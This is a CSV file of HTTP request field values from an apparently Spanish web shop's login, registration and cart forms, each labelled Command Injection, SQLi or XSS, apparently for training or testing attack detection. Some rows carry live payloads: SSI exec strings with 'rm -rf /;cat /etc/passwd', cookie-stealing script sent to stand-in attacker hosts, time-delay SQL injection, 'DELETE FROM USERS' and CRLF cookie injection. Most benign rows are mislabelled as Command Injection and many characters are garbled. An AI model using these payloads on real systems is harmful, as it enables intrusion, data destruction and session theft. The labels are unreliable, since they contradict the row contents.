payload,category
3 | Jam�n Ib�rico | 39 | 17 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | corvo | 4mbel0c11362<!--#EXEC cmd=""ls /""--> | off | Entrar HTTP/1.1",SQLi
entrar | corvo | 4mbel0c11362 | off | Entrar HTTP/1.1,Command Injection
"insertar | 7105"" AND ""1""=""1 | Pasar por caja HTTP/1.1",Command Injection
sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | 7105 | Pasar por caja HTTP/1.1,Command Injection
insertar | 7105 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 7105 | Pasar por caja HTTP/1.1,Command Injection
"registro | yung-fu | 8Ach35 | Atico | Farzati Bol�s | gobert@olvidalo.sh | 'INJECTED_PARAM | Calle Salamanca, 147, 12-C | Llacuna, La | 42192 | La Rioja | 6202220690818816 | Registrar HTTP/1.1",Command Injection
"registro | yung-fu | 8Ach35 | Atico | Farzati Bol�s | gobert@olvidalo.sh | 87238782N | Calle Salamanca, 147, 12-C | Llacuna, La | 42192 | La Rioja | 434921604510901A | Registrar HTTP/1.1",Command Injection
"registro | yung-fu | 8Ach35 | Atico | Farzati Bol�s | gobert@olvidalo.sh | 87238782N | Calle Salamanca, 147, 12-C | Llacuna, La | 42192 | La Rioja | 6202220690818816 | Registrar HTTP/1.1",Command Injection
"registro | dongmoon | setentavo | Naiara | Ballester Alumbreo | demjanenko@gesautonomos.io | 56050614M | C/ Colon 123, 6?C | Palau de Sa*nta Eul�l/ia | 43143 | Lugo | 6967344603029050 | Registrar HTTP/1.1",Command Injection
"registro | dongmoon | setentavo | Naiara | Ballester Alumbreo | demjanenko@gesautonomos.io | 56050614M | C/ Colon 123, 6?C | Cantalapiedra | 43143 | Lugo | 6967344603029050 | Registrar HTTP/1.1",Command Injection
2 | Ques+o Manchego | 39 | 65 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 39 | 65 | A�adir al carrito HTTP/1.1,Command Injection
%20 | doraine | paRra | off | Entrar HTTP/1.1,Command Injection
"entrar | doraine | ,,a�5 | off | Entrar HTTP/1.1",Command Injection
entrar | doraine | paRra | off | Entrar HTTP/1.1,Command Injection
insertar | 9857 | Pasar por caja HTTP/1.1,Command Injection
registro | prudi65 | trenzar | Anatolio | Comello Villasev | numani@deuxmanagement.io | 74498414B | Illa Digna 98 1?H | Driebes | 37794 | La Rioja | 4126065291038151 | Registrar HTTP/1.1,Command Injection
"registro | austin | va�6A | Dami�n | Haddock | ryder@mataluenga.zm | 12773567B | Oasis, 89  | Y�meda | 42181 | A Coru�a%7C | 1457291251258810 | Registrar HTTP/1.1",Command Injection
"registro | austin | va�6A | Dami�n | Haddock | herndon@coches@a@utoma@ticos.il | 12773567B | Oasis, 89  | Y�meda | 42181 | A Coru�a | 1457291251258810 | Registrar HTTP/1.1",Command Injection
"registro | austin | va�6A | Dami�n | Haddock | ryder@mataluenga.zm | 12773567B | Oasis, 89  | Y�meda | 42181 | A Coru�a | 1457291251258810 | Registrar HTTP/1.1",Command Injection
1 | Vino Rioja'INJECTED_PARAM | 85 | 7 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n' Ib�ric-'o | 85 | 7 | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino Rioja | 85 | 7 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | nezm | 1Eb5l0e | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1",SQLi
sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | nezm | 1Eb5l0e | off | Entrar HTTP/1.1,Command Injection
entrar | ro+?semari | 1Eb5l0e | off | Entrar HTTP/1.1,Command Injection
entrar | nezm | 1Eb5l0e | off | Entrar HTTP/1.1,Command Injection
"insertar | 810 | <!--#EXEC cmd=""ls /""--> HTTP/1.1",SQLi
insertar | 810 | Confirmar/ HTTP/1.1,Command Injection
insertar | 810 | Confirmar HTTP/1.1,Command Injection
"registro | bourk | acoMoDamIEnTO | Rafferty<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Aca Isach | lafuret@cortinas-de-aire.ai | 56038958X | Gijon, 93, 6?E | Pozuelo | 41749 | Barcelona | 4929562421029680 | Registrar HTTP/1.1",SQLi
"registro | bourk | acoMoDamIEnTO | Rafferty | _Es?cribano Gou | lafuret@cortinas-de-aire.ai | 56038958X | Gijon, 93, 6?E | Pozuelo | 41749 | Barcelona | 4929562421029680 | Registrar HTTP/1.1",Command Injection
"registro | elefther | a_ma6ar | Dacil | Bon�as Aleza | mallalie@u@logiteclin@es.@ly | 41273299Y | Lucas Mallada, 28,  | Cantalpino | 34469 | Guip�zcoa | 7363123052285144 | Registrar HTTP/1.1",Command Injection
"registro | elefther | a_ma6ar | Dacil | Bon�as Aleza | kohner_daikos@zarahealth.mk | 41273299Y | Lucas Mallada, 28,  | Cantalpino | 34469 | Guip�zcoa | 7363123052285144 | Registrar HTTP/1.1",Command Injection
3' DELETE FROM USERS | Queso Manchego | 100 | 14 | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 85/ | 14 | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 100 | 14 | A�adir al carrito HTTP/1.1,Command Injection
entrar | briney | concesa | on/ | Entrar HTTP/1.1,Command Injection
entrar | briney | concesa | off | Entrar HTTP/1.1,Command Injection
insertar | 8041 | Pasar por caja%20 HTTP/1.1,Command Injection
insertar | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Pasar por caja HTTP/1.1,Command Injection
insertar | 8041 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 8041 | Pasar por caja HTTP/1.1,Command Injection
"registrosessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | wendy | a-h�lo | Edelvais | Alba�il Comasoli | raidhi_altermen@prestamosypersonales.kw | 68675744K | Puerto De Canfranc 179,  | Mont�n | 12415 | Guadalajara | 8960280484576559 | Registrar HTTP/1.1",XSS
"registro | wendy | a-h�lo | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Alba�il Comasoli | raidhi_altermen@prestamosypersonales.kw | 68675744K | Puerto De Canfranc 179,  | Mont�n | 12415 | Guadalajara | 8960280484576559 | Registrar HTTP/1.1",XSS
"registro | wendy | a-h�lo | Edelvais | Alba�il Comasoli | @ha@nks@raullaza@ro.mc | 68675744K | Puerto De Canfranc 179,  | Mont�n | 12415 | Guadalajara | 8960280484576559 | Registrar HTTP/1.1",Command Injection
"registro | wendy | a-h�lo | Edelvais | Alba�il Comasoli | raidhi_altermen@prestamosypersonales.kw | 68675744K | Puerto De Canfranc 179,  | Mont�n | 12415 | Guadalajara | 8960280484576559 | Registrar HTTP/1.1",Command Injection
registro | falcao2 | AND 1=1 | Yago | Barbou | carey@x2.com.th | 91059337Z | Carrer Bruselles 112 1C | Arraya de Oca | 44591 | Barcelona | 1504583168402785 | Registrar HTTP/1.1,Command Injection
registro | falcao2 | gayera | Yago | Blas+co Barq-u.in | carey@x2.com.th | 91059337Z | Carrer Bruselles 112 1C | Arraya de Oca | 44591 | Barcelona | 1504583168402785 | Registrar HTTP/1.1,Command Injection
registro | falcao2 | gayera | Yago | Barbou | carey@x2.com.th | 91059337Z | Carrer Bruselles 112 1C | Arraya de Oca | 44591 | Barcelona | 1504583168402785 | Registrar HTTP/1.1,Command Injection
3%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Vino Rioja | 39 | 34 | A�adir al carrito HTTP/1.1,Command Injection
3 | Jam�n' Ib�ric-'o | 39 | 34 | A�adir al carrito HTTP/1.1,Command Injection
entrar | dilen | %2B | off | Entrar HTTP/1.1,Command Injection
entrar | woins?ky | pagaDEra | off | Entrar HTTP/1.1,Command Injection
entrar | dilen | pagaDEra | off | Entrar HTTP/1.1,Command Injection
insertar | 1599 | Confirmar%2B HTTP/1.1,Command Injection
insertar | 1599 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 1599 | Confirmar HTTP/1.1,Command Injection
"registro | tobye | car40m20ci8 | Amaro | Brunori | esham@cpanelweb.com.bv | 22205546N | Avda. Aldehuela, 9 13-H | Torlengua | 02510 | Palencia | 5917432990420378 | ' AND '1'='1 HTTP/1.1",Command Injection
"registro | tobye | car40m20ci8 | Amaro | Brunori | esham@cpanelweb.com.bv | 22205546N | Avda. Aldehuela, 9 13-H | Torlengua | 02510 | Palencia | 5917432990420378 | Registrar HTTP/1.1",Command Injection
"registro | izique | 48a6850ll3 | Otilia | Planelles Neris | divoka@mercadozoom.bf<!--#include file=""archivo_secreto"" --> | 36504708M | Calle Bolivia, 69,  | Avil�s | 22468 | Le�n | 1926544477784446 | Registrar HTTP/1.1",SQLi
"registro | izique | 48a6850ll3 | Otilia | Aliverti_ Sanandre?u | divoka@mercadozoom.bf | 36504708M | Calle Bolivia, 69,  | Avil�s | 22468 | Le�n | 1926544477784446 | Registrar HTTP/1.1",Command Injection
"registro | izique | 48a6850ll3 | Otilia | Planelles Neris | divoka@mercadozoom.bf | 36504708M | Calle Bolivia, 69,  | Avil�s | 22468 | Le�n | 1926544477784446 | Registrar HTTP/1.1",Command Injection
3 | Vino Rioja | 85/ | 77 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 100 | 77 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | macmulli6 | imp1o,nunci0,b'le | on | Entrar HTTP/1.1",Command Injection
entrar | macmulli6 | A1391+18u46 | on | Entrar HTTP/1.1,Command Injection
insertar | 3546 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 3546 | Confirmar HTTP/1.1,Command Injection
"registro | alix | venI!A | Imelda | Delb�n Coll | holister@brunoseguridad.cf | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Plza. Noria De La Huerta 68,  | Alcudia de Veo | 28690 | �vila | 6551003767368321 | Registrar HTTP/1.1",Command Injection
"registro | alix | venI!A | Imelda | Delb�n Coll | holister@brunoseguridad.cf | 80525673M | Plza. Noria De La Huerta 68,  | Alcudia de Veo | 28690 | Alba/c/ete | 6551003767368321 | Registrar HTTP/1.1",Command Injection
"registro | alix | venI!A | Imelda | Delb�n Coll | holister@brunoseguridad.cf | 80525673M | Plza. Noria De La Huerta 68,  | Alcudia de Veo | 28690 | �vila | 6551003767368321 | Registrar HTTP/1.1",Command Injection
"registro | publicat | 12l4rO | Froil�n | Arenzana Carrafa | bane@juegosgratisinternet.nr | 08530797M | Calle Angel Mu�iz Toca, 16*+1  | Santib��ez de Vidriales | 10815 | Granada | 0788909004705438 | Registrar HTTP/1.1",Command Injection
"registro | publicat | 12l4rO | Froil�n | Arenzana Carrafa | bane@juegosgratisinternet.nr | 08530797M | C/ Kanala, 15  | Santib��ez de Vidriales | 10815 | Granada | 0788909004705438 | Registrar HTTP/1.1",Command Injection
2 | Vino Rioja | 85| | 67 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 39/ | 67 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 85 | 67 | A�adir al carrito HTTP/1.1,Command Injection
entrar | romani%3F | examEN | off | Entrar HTTP/1.1,Command Injection
entrar | romani | examEN | off/ | Entrar HTTP/1.1,Command Injection
entrar | romani | examEN | off | Entrar HTTP/1.1,Command Injection
insertar | 8064any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Confirmar HTTP/1.1,Command Injection
insertar | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Confirmar HTTP/1.1,Command Injection
insertar | 8064 | Confirmar/ HTTP/1.1,Command Injection
"registro | arcouet | man17lme73e | Landelina | Dangla Llobera | grimaud@vi�avilano.bu | 17030732Z | Calle Santa Maria, 38, 9A | Santa Gadea del Cid | 08560 | Palenciabob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | 5358171636012894 | Registrar HTTP/1.1",Command Injection
"registro | arcouet | man17lme73e | Landelina | Gaytan _Bayano | grimaud@vi�avilano.bu | 17030732Z | Calle Santa Maria, 38, 9A | Santa Gadea del Cid | 08560 | Palencia | 5358171636012894 | Registrar HTTP/1.1",Command Injection
"registro | arcouet | man17lme73e | Landelina | Dangla Llobera | grimaud@vi�avilano.bu | 17030732Z | Calle Santa Maria, 38, 9A | Santa Gadea del Cid | 08560 | Palencia | 5358171636012894 | Registrar HTTP/1.1",Command Injection
"registro | yueping1 | f9e2dora | Harissa | Aregall Picabea | goorwitz-sejbalova@hostingprofessional.com.jobs | 66204492G | Risue�o 141,  | Font d'En Carr�s, la@40 | 29551 | Huelva | 3999806738331009 | Registrar HTTP/1.1",Command Injection
"registro | yueping1 | f9e2dora | Harissa | Aregall Picabea | goorwitz-sejbalova@hostingprofessional.com.jobs | 66204492G | "" AND ""1""=""1 | Font d'En Carr�s, la | 29551 | Huelva | 3999806738331009 | Registrar HTTP/1.1",Command Injection
"registro | yueping1 | f9e2dora | Harissa | Aregall Picabea | goorwitz-sejbalova@hostingprofessional.com.jobs | '2641170P | Risue�o 141,  | Font d'En Carr�s, la | 29551 | Huelva | 3999806738331009 | Registrar HTTP/1.1",Command Injection
"registro | yueping1 | f9e2dora | Harissa | Aregall Picabea | goorwitz-sejbalova@hostingprofessional.com.jobs | 66204492G | Risue�o 141,  | Font d'En Carr�s, la | 29551 | Huelva | 3999806738331009 | Registrar HTTP/1.1",Command Injection
3 | Vino Rioja | 100/ | 17 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 100 | 17 | A�adir al carrito HTTP/1.1,Command Injection
entrar | driedger | boquitorcida | on | Entrar HTTP/1.1,Command Injection
insertar | 2323 | Confirmar/ HTTP/1.1,Command Injection
insertar | 2323 | Pasar por caja HTTP/1.1,Command Injection
"registro | crafton | p2_l5ote | Peregrina | Mengual Bartumeu | feliciano@atorre.mobi | 80328105F | Calle Zurbaran, 131,  | Busot%20 | 48195 | Sevilla | 4168827609798795 | Registrar HTTP/1.1",Command Injection
"registro | crafton | p2_l5ote | Peregrina | Mengual Bartumeu | feliciano@atorre.mobi | 80328105F | Calle Zurbaran, 131,  | ','0','0');waitfor delay '0:0:15';-- | 48195 | Sevilla | 4168827609798795 | Registrar HTTP/1.1",SQLi
"registro | crafton | p2_l5ote | Peregrina | Mengual Bartumeu | feliciano@atorre.mobi | 80328105F | Calle Zurbaran, 131,  | Busot | 48195 | Sevilla | 894473952515284A | Registrar HTTP/1.1",Command Injection
"registro | crafton | p2_l5ote | Peregrina | Mengual Bartumeu | feliciano@atorre.mobi | 80328105F | Calle Zurbaran, 131,  | Busot | 48195 | Sevilla | 4168827609798795 | Registrar HTTP/1.1",Command Injection
"registro | hatti | viTUpeRAdOr | ? | C�mara Dovale | tiensuwan@zarasalud.py | 84598781C | Calle Sor Mercedes S/N 12-D | Lloar, El | 24170 | Valladolid | 4582509168680893 | Registrar HTTP/1.1",Command Injection
"registro | hatti | viTUpeRAdOr | Guiliano | C�mara Dovale | tiensuwan@zarasalud.py | 84598781C | P+la�a Joan Corrades i Bo+sch, 8*4,  | Lloar, El | 24170 | Valladolid | 4582509168680893 | Registrar HTTP/1.1",Command Injection
2 | Jam�n' Ib�ric-'o | 39 | 7 | A�adir al carrito HTTP/1.1,Command Injection
2 | Jam�n Ib�rico | 39 | 7 | A�adir al carrito HTTP/1.1,Command Injection
entrar | bowden | mel-enerabob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | off | Entrar HTTP/1.1,XSS
entrar | bowden | mel-enera | off/ | Entrar HTTP/1.1,Command Injection
entrar | bowden | mel-enera | off | Entrar HTTP/1.1,Command Injection
insertar | 486 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 486 | Pasar por caja HTTP/1.1,Command Injection
registro | hannula | f0anh5eso | Josela | Urzagaste Galdon | cantinflas@atrioregalos.bz | 06064345G | C/ Batalla De Aina 190 6?A | V/illega*s | 24359 | Salamanca | 6513561251939678 | Registrar HTTP/1.1,Command Injection
registro | hannula | f0anh5eso | Josela | Urzagaste Galdon | cantinflas@atrioregalos.bz | 06064345G | C/ Batalla De Aina 190 6?A | Sant Fost de Campsentelles | 24359 | Salamanca | 6513561251939678 | Registrar HTTP/1.1,Command Injection
"registro | usa9 | ENjuaGaDiEnTES | Johana | Colldevall | scepi@14horas.ao | 04746545N | Aldea 172,  | Villota del P�ramo | AND 1=1 | La Rioja | 0365839887327935 | Registrar HTTP/1.1",Command Injection
"registro | usa9 | ENjuaGaDiEnTES | Johana | Colldevall | scepi@14horas.ao | 04746545N | Ro*nda Ebre+, 144 5-*D | Villota del P�ramo | 43694 | La Rioja | 0365839887327935 | Registrar HTTP/1.1",Command Injection
"registro | usa9 | ENjuaGaDiEnTES | Johana | Colldevall | scepi@14horas.ao | 04746545N | Aldea 172,  | Villota del P�ramo | 43694 | La Rioja | 0365839887327935 | Registrar HTTP/1.1",Command Injection
3 | ' DELETE FROM USERS | 39 | 21 | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 85/ | 21 | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 39 | 21 | A�adir al carrito HTTP/1.1,Command Injection
entrar | chima | 58rB57�f51'9 | on | Entrar HTTP/1.1,Command Injection
entrar | chima | sangriza | on | Entrar HTTP/1.1,Command Injection
insertar' DELETE FROM USERS | 4903 | Pasar por caja HTTP/1.1,Command Injection
insertar | 4903 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 4903 | Pasar por caja HTTP/1.1,Command Injection
"registro | bulanda | co3trI�ir | Beatriz | Cartoni. _Mendiz.�bal | binney8@telogis.lb | 39498492V | Calle Atico Noguerol 192, 7E | Elduain | 22190 | Toledo | 1924133576102581 | Registrar HTTP/1.1",Command Injection
"registro | bulanda | co3trI�ir | Beatriz | Calvet Ibars | binney8@telogis.lb | 39498492V | Calle Atico Noguerol 192, 7E | Elduain | 22190 | Toledo | 1924133576102581 | Registrar HTTP/1.1",Command Injection
"registro | farah | !FIlatelia | Cayetano | Mesquida Carrasco | kaynak@campodegolf.com.sc | 86164975Y<!--#EXEC cmd=""ls /""--> | Calle Pellejero Villoria, 184 11?B | Viveros | 21870 | C�rdoba | 1552564007403755 | Registrar HTTP/1.1",SQLi
"registro | farah | !FIlatelia | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Mesquida Carrasco | kaynak@campodegolf.com.sc | 86164975Y | Calle Pellejero Villoria, 184 11?B | Viveros | 21870 | C�rdoba | 1552564007403755 | Registrar HTTP/1.1",Command Injection
"registro | farah | !FIlatelia | Cayetano | Mesquida Carrasco | kaynak@campodegolf.com.sc | 8841A593Y | Calle Pellejero Villoria, 184 11?B | Viveros | 21870 | C�rdoba | 1552564007403755 | Registrar HTTP/1.1",Command Injection
"registro | farah | !FIlatelia | Cayetano | Mesquida Carrasco | kaynak@campodegolf.com.sc | 86164975Y | Calle Pellejero Villoria, 184 11?B | Viveros | 21870 | C�rdoba | 1552564007403755 | Registrar HTTP/1.1",Command Injection
"2 | Vino Rioja<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 39 | 69 | A�adir al carrito HTTP/1.1",SQLi
3/ | Vino Rioja | 39 | 69 | A�adir al carrito HTTP/1.1,Command Injection
entrar | k/lashins | preconizac!i�n | off | Entrar HTTP/1.1,Command Injection
entrar | fatica | preconizac!i�n | off | Entrar HTTP/1.1,Command Injection
insertar | 5434 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 5434 | Confirmar HTTP/1.1,Command Injection
');waitfor delay '0:0:15';-- | krausbar | 126i46ca79�n | Isa�l | Coev Carles | jeaves@redhost.aero | 27708977A | Cervera 46 13-H | Solivella | 47691 | Barcelona | 2980660510325529 | Registrar HTTP/1.1,SQLi
registro | krausbar | 126i46ca79�n | Isa�l | Coev Carles | jeaves@redhost.aero | 27708977A | Cervera 46 13-H | Solivella | 47691 | Barcelona | 2980660510325529 | Registrar HTTP/1.1,Command Injection
registro | omayma | fr78gen5e | ';waitfor delay '0:0:15';-- | Pe�afiel | flagg@bacoespecialselecci�n.lb | 40888726Q | Prolongacion Jose Zorrilla 56  | Muxika | 06413 | �vila | 5771094131298411 | Registrar HTTP/1.1,SQLi
registro | omayma | fr78gen5e | Ro?mari | Pe�afiel | flagg@bacoespecialselecci�n.lb | 40888726Q | Prolongacion Jose Zorrilla 56  | Muxika | 06413 | �vila | 5771094131298411 | Registrar HTTP/1.1,Command Injection
registro | omayma | fr78gen5e | Olimpio | Pe�afiel | flagg@bacoespecialselecci�n.lb | 40888726Q | Prolongacion Jose Zorrilla 56  | Muxika | 06413 | �vila | 5771094131298411 | Registrar HTTP/1.1,Command Injection
"1 | Queso Manchego<!--#include file=""archivo_secreto"" --> | 39 | 59 | A�adir al carrito HTTP/1.1",SQLi
2/ | Queso Manchego | 39 | 59 | A�adir al carrito HTTP/1.1,Command Injection
entrar | halsyany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | engarbado | off | Entrar HTTP/1.1,Command Injection
entrar | halsy | 4'sc'o23U'To | off | Entrar HTTP/1.1,Command Injection
entrar | halsy | engarbado | off | Entrar HTTP/1.1,Command Injection
insertar | 4831 | Confirmar? HTTP/1.1,Command Injection
insertar | 4831 | Confirmar/ HTTP/1.1,Command Injection
insertar | 4831 | Confirmar HTTP/1.1,Command Injection
"registro | lachance | su5a | Rogato | Cucarell Caridad | zmed@tabernarinconete.uk | 19477061V';waitfor delay '0:0:15';-- | Manuel Paez Xaramillo 33, 6B | Estella/Lizarra | 26321 | Tarragona | 9995470732934706 | Registrar HTTP/1.1",SQLi
"registro | %3F | su5a | Rogato | Cucarell Caridad | zmed@tabernarinconete.uk | 19477061V | Manuel Paez Xaramillo 33, 6B | Estella/Lizarra | 26321 | Tarragona | 9995470732934706 | Registrar HTTP/1.1",Command Injection
"registro | lachance | su5a | Rogato | Cucarell Caridad | hed@ay@a@d@rivinn.tl | 19477061V | Manuel Paez Xaramillo 33, 6B | Estella/Lizarra | 26321 | Tarragona | 9995470732934706 | Registrar HTTP/1.1",Command Injection
"registro | lachance | su5a | Rogato | Cucarell Caridad | zmed@tabernarinconete.uk | 19477061V | Manuel Paez Xaramillo 33, 6B | Estella/Lizarra | 26321 | Tarragona | 9995470732934706 | Registrar HTTP/1.1",Command Injection
"registro | michial3 | 83o3i7a374 | Teodomira | D'Paoli Garros | bessell@ttivoni.is | 32124292Psessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | C/ Montevideo 193,  | Rupi� | 39572 | Burgos | 8086742983774365 | Registrar HTTP/1.1",XSS
"registro | michial3 | 83o3i7a374 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | D'Paoli Garros | bessell@ttivoni.is | 32124292P | C/ Montevideo 193,  | Rupi� | 39572 | Burgos | 8086742983774365 | Registrar HTTP/1.1",SQLi
"registro | michial3 | 83o3i7a374 | Teodomira | D'Paoli Garros | bessell@ttivoni.is | 32124292P | C/ Montevideo 193,  | Rupi� | 39572 | Burgos | 8086742983774365 | Registrar HTTP/1.1",Command Injection
3 | Queso Manchego | 100/ | 33 | A�adir al carrito HTTP/1.1,Command Injection
"entrar','0','0','0','0');waitfor delay '0:0:15';-- | zaretsky | 40c7c0o | off | Entrar HTTP/1.1",SQLi
entrar | zaretsky | 40c7c0o | AND 1=1 | Entrar HTTP/1.1,Command Injection
entrar | k?ar+ie | 40c7c0o | off | Entrar HTTP/1.1,Command Injection
entrar | zaretsky | 40c7c0o | off | Entrar HTTP/1.1,Command Injection
insertarbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | 1746 | Pasar por caja HTTP/1.1,Command Injection
"registro | + | encara | Marcelino | Mundo Osarte | vanni@sietepeines.eu | 76973319R | C/ Eugenio Arbones, 84, 9-G | Daya Vieja | 43770 | Barcelona | 7672564317265745 | Registrar HTTP/1.1",Command Injection
"registro | sameh | encara | Marcelino | Mundo Osarte | vanni@sietepeines.eu | 60B999025N | C/ Eugenio Arbones, 84, 9-G | Daya Vieja | 43770 | Barcelona | 7672564317265745 | Registrar HTTP/1.1",Command Injection
"registro | sameh | encara | Marcelino | Mundo Osarte | vanni@sietepeines.eu | 76973319R | C/ Eugenio Arbones, 84, 9-G | Daya Vieja | 43770 | Barcelona | 7672564317265745 | Registrar HTTP/1.1",Command Injection
"registro | arjun1 | lan$�a | | | Tirado Paulet | arlen@cienciapolicial.va | 61317153G | Gongora, 129  | Gabiria | 13333 | Segovia | 6277517976007301 | Registrar HTTP/1.1",Command Injection
"registro | arjun1 | lan$�a | Walkiria | Tirado Paulet | arlen@cienciapolicial.va | 61317153G | Gongora, 129  | Gabiria | 13333 | Vallad?oli+d | 6277517976007301 | Registrar HTTP/1.1",Command Injection
"registro | arjun1 | lan$�a | Walkiria | Tirado Paulet | arlen@cienciapolicial.va | 61317153G | Gongora, 129  | Gabiria | 13333 | Segovia | 6277517976007301 | Registrar HTTP/1.1",Command Injection
2' DELETE FROM USERS | Queso Manchego | 39 | 98 | A�adir al carrito HTTP/1.1,Command Injection
Set-cookie%3A+Tamper%3D1041264011025374727 | Queso Manchego | 39 | 98 | A�adir al carrito HTTP/1.1,Command Injection
2/ | Queso Manchego | 39 | 98 | A�adir al carrito HTTP/1.1,Command Injection
2 | Queso Manchego | 39 | 98 | A�adir al carrito HTTP/1.1,Command Injection
entrar | maciejew | de!senmara�ar | on/ | Entrar HTTP/1.1,Command Injection
entrar | maciejew | de!senmara�ar | on | Entrar HTTP/1.1,Command Injection
insertar | 8650 | Confirmarany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,Command Injection
insertar | 8650 | Confirmar/ HTTP/1.1,Command Injection
insertar | 8650 | Confirmar HTTP/1.1,Command Injection
"registro | morrie','0','0','0','0');waitfor delay '0:0:15';-- | ePa | Erlan | Sordo Alquinta | nieva@menorca.com.sz | 22787443D | Pl. De La Palomera, S/N 2?D | Oss� de Si� | 31353 | Badajoz | 5124736256894307 | Registrar HTTP/1.1",SQLi
"registro | morrie | ,int/errogativo | Erlan | Sordo Alquinta | nieva@menorca.com.sz | 22787443D | Pl. De La Palomera, S/N 2?D | Oss� de Si� | 31353 | Badajoz | 5124736256894307 | Registrar HTTP/1.1",Command Injection
"registro | morrie | ePa | Erlan | Sordo Alquinta | nieva@menorca.com.sz | 22787443D | Pl. De La Palomera, S/N 2?D | Oss� de Si� | 31353 | Badajoz | 5124736256894307 | Registrar HTTP/1.1",Command Injection
